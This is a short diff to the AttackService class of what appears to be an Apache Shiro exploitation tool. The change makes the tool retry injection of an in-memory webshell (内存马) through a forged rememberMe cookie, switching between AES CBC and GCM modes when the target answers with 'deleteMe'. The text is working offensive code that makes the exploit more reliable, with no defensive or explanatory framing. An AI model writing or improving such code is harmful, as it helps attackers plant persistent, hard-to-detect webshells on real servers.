@@ -913,6 +913,22 @@ public class AttackService {
         String label = memTypeLabelForLog != null && !memTypeLabelForLog.trim().isEmpty()
                 ? memTypeLabelForLog.trim() : "内存马生成";
         String result = this.injectMemWithCookieAndUserBody(rememberMe, userPart, shellPass, shellPath, logArea, false, label);
+        // AES 模式自动重试
+        if (result != null && result.contains("=deleteMe") && !result.contains("->|Success|<-")) {
+            int altMode = aesGcmCipherType == 0 ? 1 : 0;
+            logArea.appendText(Utils.log("[*] 切换 AES 模式为 " + (altMode == 1 ? "GCM" : "CBC") + " 重试..."));
+            int origMode = aesGcmCipherType;
+            aesGcmCipherType = altMode;
+            String retryRememberMe = this.GadgetPayload(gadgetOpt, "InjectMemTool", shiroKey);
+            if (retryRememberMe != null) {
+                result = this.injectMemWithCookieAndUserBody(retryRememberMe, userPart, shellPass, shellPath, logArea, false, label);
+                if (result != null && result.contains("=deleteMe") && !result.contains("->|Success|<-")) {
+                    aesGcmCipherType = origMode;
+                }
+            } else {
+                aesGcmCipherType = origMode;
+            }
+        }
         appendResponseSummary(logArea, "[Shiro+InjectMemTool] 已发送", result);
         if (result != null) {
             if (result.length() <= 2000) {
